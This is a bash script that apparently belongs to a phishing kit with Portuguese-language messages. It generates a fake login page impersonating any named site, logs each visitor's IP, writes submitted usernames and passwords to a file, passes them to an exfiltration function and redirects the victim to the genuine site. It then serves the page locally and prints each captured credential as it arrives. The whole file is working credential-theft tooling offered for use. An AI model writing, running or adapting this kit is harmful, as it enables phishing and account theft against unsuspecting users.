#!/bin/bash
R="$(cd "$(dirname "$0")/.." && pwd)"
SITE="$1"
DIR="$R/sites/$SITE"
SRV="$R/.server/www"
mkdir -p "$DIR" "$SRV"

if [ ! -f "$DIR/index.php" ]; then
  cat > "$DIR/index.php" << EOP
<?php
\$ip=\$_SERVER['REMOTE_ADDR']??'?';
require_once __DIR__.'/core/ip.php';
lph_iplog(\$ip);
header('Location: login.html');
EOP
  cat > "$DIR/login.html" << EOH
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title><link rel="stylesheet" href="/style.css"><script src="/sandbox.js"></script></head>
<body><div class="lph-wrap"><h1 class="lph-title">Entrar no $SITE</h1><form method="post" action="login.php"><input class="lph-input" type="text" name="user" placeholder="Usuário" required><input class="lph-input" type="password" name="pass" placeholder="Senha" required><button class="lph-btn" type="submit">Entrar</button></form></div></body></html>
EOH
  cat > "$DIR/login.php" << EOP
<?php
\$u=\$_POST['user']??'';\$p=\$_POST['pass']??'';
require_once __DIR__.'/core/exfil.php';
@file_put_contents(__DIR__.'/../../auth/usernames.dat',"User: \$u\nPass: \$p\nIP: ".(\$_SERVER['REMOTE_ADDR']??'?')."\n---\n",FILE_APPEND);
lph_exfil('credential',['platform'=>'$SITE','user'=>\$u,'pass'=>\$p]);
header('Location: https://$SITE.com');
EOP
fi

rm -rf "$SRV"/*
cp -r "$DIR/." "$SRV/"
cp -r "$R/core" "$SRV/core"
cp -r "$R/.server/www/"*.css "$SRV/" 2>/dev/null
cp -r "$R/.server/www/"*.js "$SRV/" 2>/dev/null

echo -e "\033[1;31m[+] Servidor $SITE iniciado.\033[0m"
read -rp "Porta [8080]: " p; p="${p:-8080}"
echo -e "\033[1;37m[+] Acesse: http://127.0.0.1:$p\033[0m"
echo -e "\033[1;31m[+] Aguardando capturas... (Ctrl+C para parar)\033[0m"

trap 'echo -e "\n\033[1;31m[!] Servidor parado.\033[0m"; pkill -f "php -S 127.0.0.1:$p"; exit 0' SIGINT
php -S 127.0.0.1:$p -t "$SRV" >/dev/null 2>&1 &

while true; do
  if [ -f "$SRV/usernames.dat" ]; then
    echo -e "\n\033[1;31m[+] CREDENCIAL CAPTURADA!\033[0m"
    cat "$SRV/usernames.dat"
    cat "$SRV/usernames.dat" >> "$R/auth/usernames.dat"
    rm "$SRV/usernames.dat"
  fi
  sleep 1
done
